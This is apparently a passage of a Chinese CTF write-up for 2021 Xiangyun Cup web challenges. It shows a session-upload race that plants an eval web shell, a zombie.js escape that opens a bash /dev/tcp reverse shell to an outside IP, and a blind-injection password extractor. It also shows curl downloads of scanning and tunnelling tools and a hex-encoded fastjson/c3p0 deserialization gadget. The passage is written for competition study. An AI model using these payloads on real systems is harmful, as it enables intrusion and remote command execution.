<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sess_id = <span class="string">&#x27;Atao&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">128</span>)</span><br><span class="line">        session.post(url=<span class="string">&#x27;http://eci-2ze7cuv076c4risfr6z3.cloudeci1.ichunqiu.com&#x27;</span>, </span><br><span class="line">                     data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;aaaaasdasdasd&lt;?php phpinfo();file_put_contents(&quot;/tmp/1&quot;,&quot;&lt;?php eval(base64_decode(\$_GET[1]));phpinfo();?&gt;&quot;);?&gt;&#x27;</span>&#125;, </span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;atao.txt&#x27;</span>,f)&#125;, </span><br><span class="line">                     cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sess_id&#125;</span><br><span class="line">                     )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">80</span>):</span><br><span class="line">        threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_3.png"></p>
<p>接着去访问<code>http://127.0.0.1/admin/include123.php?u=/tmp/sess_Atao</code>，访问到回显了<code>phpinfo</code>即可</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_4.png"></p>
<p>这里写入<code>/tmp/1</code>一句话木马，接着访问<code>http://127.0.0.1/admin/include123.php?u=/tmp/1&amp;1=c3lzdGVtKCIvZ2V0ZmxhZy5zaCIpOw==</code>即可获得flag</p>
<h2 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h2><p><strong>考点：zombie的Nday漏洞、变量覆盖</strong></p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_5.png"></p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_6.png"></p>
<p>从图一可知，<code>personalBucket</code>要和<code>bucket</code>的变量相同，图二中，<code>personalBucket</code>又会赋给<code>user.bucket</code>。所以这里我们可以发三次请求，第一次：正常请求主要是为了获得<code>token</code>值；第二次：上传exp的IP地址为了修改<code>personalBucket</code>内容；第三次：通过<code>/user/verify？token=</code>覆盖<code>user.bucket</code></p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_7.png"></p>
<p>这里还有一个需要绕过的地方，在IP的结尾要跟上<code>oss-cn-beijing.ichunqiu.com</code>，如<code>http://IP/index.html?aaa=oss-cn-beijing.ichunqiu.com</code>即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;c=<span class="string">&#x27;constructor&#x27;</span>;<span class="built_in">this</span>[c][c](<span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;var sync=require(&#x27;child_process&#x27;).spawnSync; var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/47.98.147.229/7777 0&gt;&amp;1&#x27;],);console.log(ls.output.toString());&quot;</span>)()&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>把上面的代码放在vps的index.html，zombie Nday漏洞参考链接：<a target="_blank" rel="noopener" href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_8.png"></p>
<p>最后通过<code>/user/bucket</code>路由反弹shell，执行/readflag命令</p>
<h2 id="PackageManager2021"><a href="#PackageManager2021" class="headerlink" title="PackageManager2021"></a>PackageManager2021</h2><p><strong>考点：SQL注入</strong></p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_9.png"></p>
<p>通过审计源码，发现此处存在SQL注入的漏洞，可以通过构造<code>00f355689f5b7cb21e2a34346d9c55cd&quot;||(this.username==&quot;admin&quot;&amp;&amp;this.password[i]==&quot;j&quot;)||this.username==&quot;123</code>的Payload进行注入，获得admin用户的密码</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_10.png"></p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_11.png"></p>
<p>上图可知，存在Bool盲注，这里最后的this.username为我们一开始注册的账户</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># b!@#$d5dh47jyfz#098crw*w</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        burp0_url = <span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3Adq6vnQaD6PED4EhGg1tTvmpLa1FpJrUO.ATo3wP4XqidqLO0TbwAchNH41OxUxFFjF7KFNDKzVDs&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;otezaj5Q-ZVimOBu-Aiw82rOf_hKkqlkbrvE&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;token&quot;</span>: <span class="string">&quot;00f355689f5b7cb21e2a34346d9c55cd\&quot;||(this.username==\&quot;admin\&quot;&amp;&amp;this.password[&#123;&#125;]==\&quot;&#123;&#125;\&quot;)||this.username==\&quot;123&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(j))&#125;</span><br><span class="line">        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+<span class="built_in">chr</span>(j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;No matching results&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">126</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_12.png"></p>
<p>从上图可知admin的password，登陆了admin用户就可以获得flag了，flag为<code>flag&#123;407bb420-7845-4722-a322-f3f11b5bf09f&#125;</code></p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_13.png"></p>
<h2 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h2><p><strong>考点：Apache Flink 任意 Jar 包上传导致远程代码执行漏洞+fastjson反序列化</strong></p>
<p>首先是：Apache Flink 任意 Jar 包上传导致远程代码执行漏洞</p>
<p>有现成的脚本：<a target="_blank" rel="noopener" href="https://github.com/LandGrey/flink-unauth-rce">https://github.com/LandGrey/flink-unauth-rce</a></p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822004710291.png"></p>
<p>但是一直无法连接shell，可能是连接的人太多了，于是就改了一下脚本，直接在vps一直监听着，然后脚本一直跑着，等着环境重启，终于连接上了，然后并没有找到flag，再加上题目说了内网地址，所以怀疑还有内网环境，于是下载fscan（ <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a> ）扫描了一波，发现存在内网环境</p>
<p>进入tmp目录，使用curl下载fscan，我放到我自己的vps上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://81.70.105.149/fscan_amd64 &gt;&gt; fscan_amd64</span><br></pre></td></tr></table></figure>

<p>然后赋予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 fscan_amd64</span><br></pre></td></tr></table></figure>

<p>然后进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./fscan_amd64 -h 10.10.1.1/24</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822005343072.png"></p>
<p>发现内网 10.10.1.11 存在Shiro SprintBoot</p>
<p>于是就想着转发出来比较方便，继续下载了portmap( <a target="_blank" rel="noopener" href="http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip">http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</a> ），我也是现将文件放至自己的vps然后使用curl下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://81.70.105.149/portmap &gt;&gt; portmap</span><br></pre></td></tr></table></figure>

<p>然后也是赋予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 portmap</span><br></pre></td></tr></table></figure>

<p>然后在vps上运行，就是将5567端口的数据转发至8005端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./portmap -m 2 -p1 5567 -p2 8005</span><br></pre></td></tr></table></figure>

<p>然后再在靶机上运行，将内网环境转发出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./portmap -m 3 -h1 81.70.105.149 -p1 5567 -h2 10.10.1.11 -p2 8080</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p>vps</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011142791.png"></p>
<p>靶机</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011411222.png"></p>
<p>然后就可以在公网访问了</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011616679.png"></p>
<p>题目提供了源码，下载下来，使用jd-gui反编译查看一下</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011809006.png"></p>
<p>账号密码为 admin / 123456</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011841331.png"></p>
<p>还发现了fastjson，但是有waf，需要绕过</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011951648.png"></p>
<p>然后再lib里发现了 hibernate-c3p0-5.3.14.Final.jar</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822012322550.png"></p>
<p>在githun上面找到了绕过方式，c3p0反序列化（<a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-c3p0%EF%BC%89">https://github.com/depycode/fastjson-c3p0）</a></p>
<p>readme里面有说明</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822012616086.png"></p>
<p>要想反序列化需要想登陆获取cookie，所以先登录</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014417948.png"></p>
<p>获取到cookie后bp抓包，修改数据包，直接将利用链复制粘贴，然后直接粘贴的话就会回显太短</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014602111.png"></p>
<p>因为对传入的长度进行了判断</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014700548.png"></p>
<p>所以直接就再填充2w的数据即可，最后的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /admin/test HTTP/1.1</span><br><span class="line">Host: 81.70.105.149:8005</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">cmd: cat /flag</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 28963</span><br><span class="line">Cookie: d0c13ba04d29a2c666096db3206682c8=6f2998af-b14a-4ebc-9002-eea46873c544.KgKniEGW1GMEX6nqT4eQLtFMsXQ; request_token=8c7wo37zB5OkLDIpgnqfuht93rbWqTEjsLvir0wS0soYk8XE; pro_end=-1; ltd_end=-1; serverType=apache; order=id%20desc; memSize=1838; bt_user_info=%7B%22status%22%3Atrue%2C%22msg%22%3A%22%u83B7%u53D6%u6210%u529F%21%22%2C%22data%22%3A%7B%22username%22%3A%22158****9824%22%7D%7D; rank=list; Path=/www/wwwroot/myweb; file_recycle_status=true; JSESSIONID=4A2824342782C0A7393AF8ACF226F26B</span><br><span class="line"></span><br><span class="line">&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;&quot;&#125;,</span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;a&quot;: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA